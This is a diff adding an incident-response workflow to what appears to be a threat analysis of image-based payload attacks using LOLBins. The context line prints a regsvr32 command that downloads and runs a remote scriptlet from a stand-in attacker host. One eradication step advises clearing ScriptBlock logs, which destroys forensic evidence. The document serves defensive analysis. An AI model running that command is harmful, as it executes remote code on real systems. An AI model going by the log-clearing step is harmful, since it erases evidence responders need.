@@ -348,3 +348,76 @@ regsvr32 /s /n /u /i:https://cdn.attacker.com/stage.sct scrobj.dll
                    v
       SYSTEM COMPROMISE → CREDENTIAL THEFT
 
+#11. Incident Response Workflow (Aligned to IR & Threat Modelling SOP)
+
+Step 1 — Identify
+
+Confirm presence of:
+
+Office/browser → LOLBin → PNG read → network chain
+
+Fileless execution artifacts
+
+Suspicious TLS outbound traffic
+
+
+Immediately tag endpoints as P1 priority
+
+
+Step 2 — Contain
+
+Isolate endpoint using MDE automated response
+
+Block observed C2 domain/IP at firewall/WAF
+
+Disable exposed user accounts (O365 + local AD)
+
+
+Step 3 — Investigate
+
+Extract full process lineage from:
+
+DeviceProcessEvents
+
+DeviceFileEvents
+
+DeviceNetworkEvents
+
+
+Check mailbox for matching malicious HTML/PNG delivery
+
+Review browsing and download history
+
+
+Step 4 — Eradicate
+
+Remove persistence:
+
+Startup entries
+
+Schedule tasks
+
+Registry Run keys
+
+
+Clear ScriptBlock logs revealing decoded payload
+
+
+Step 5 — Recover
+
+Rebuild compromised hosts if memory-only RAT activity detected
+
+Re-enable accounts post-password reset
+
+Validate no lateral movement occurred (PsExec, WMI, RPC)
+
+
+Step 6 — Lessons Learned
+
+Add sender domain to banned list
+
+Enable stricter attachment filtering (block HTML)
+
+Implement WDAC policy for script engines
+
+Update threat model under “Initial Access: Image-Based Payloads”
